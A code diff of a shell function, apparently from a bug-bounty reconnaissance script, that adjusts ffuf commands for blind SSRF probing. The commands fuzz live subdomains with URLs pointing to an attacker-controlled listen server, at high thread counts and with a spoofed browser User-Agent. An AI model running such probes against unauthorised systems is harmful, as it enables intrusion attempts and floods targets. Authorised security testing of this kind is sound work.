@@ -479,7 +479,7 @@ ssrftest(){
     echo
     # https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt
     echo "[$(date | awk '{ print $4}')] [SSRF-2] Blind probe..."
-    xargs -n1 -I {} ffuf -timeout 4 -mc all -t 1050 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
+    xargs -n1 -I {} ffuf -timeout 1 -ignore-body -t 1050 -u HOST/\?{}=https://${LISTENSERVER}/DOMAIN/{} \
                          -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
                          -w $TARGETDIR/3-all-subdomain-live-socket.txt:DOMAIN \
                          -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36" \
@@ -504,7 +504,7 @@ ssrftest(){
       echo "[$(date | awk '{ print $4}')] [SSRF-3] fuzz original endpoints from wayback and fetched data"
       ENDPOINTCOUNT=$(< $TARGETDIR/ssrf-original-list.txt wc -l)
       echo "requests count = $ENDPOINTCOUNT"
-          ffuf -timeout 5 -mc all -t 750 -u HOST -w $TARGETDIR/ssrf-original-list.txt:HOST > /dev/null
+          ffuf -timeout 1 -ignore-body -t 750 -u HOST -w $TARGETDIR/ssrf-original-list.txt:HOST > /dev/null
       echo "[$(date | awk '{ print $4}')] [SSRF-3] done."
       echo
       echo "[$(date | awk '{ print $4}')] [SSRF-4] fuzz mixed headers with original endpoints from wayback and fetched data"
@@ -519,7 +519,7 @@ ssrftest(){
       echo "HOSTCOUNT=$HOSTCOUNT \t ENDPOINTCOUNT=$ENDPOINTCOUNT"
       echo $(($HOSTCOUNT*$ENDPOINTCOUNT))
 
-          ffuf -timeout 4 -mc all -t 750 -u HOSTPATH \
+          ffuf -timeout 1 -ignore-body -t 750 -u HOSTPATH \
               -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
               -w $TARGETDIR/ssrf-list.txt:PATH > /dev/null
       echo "[$(date | awk '{ print $4}')] [SSRF-5] done."
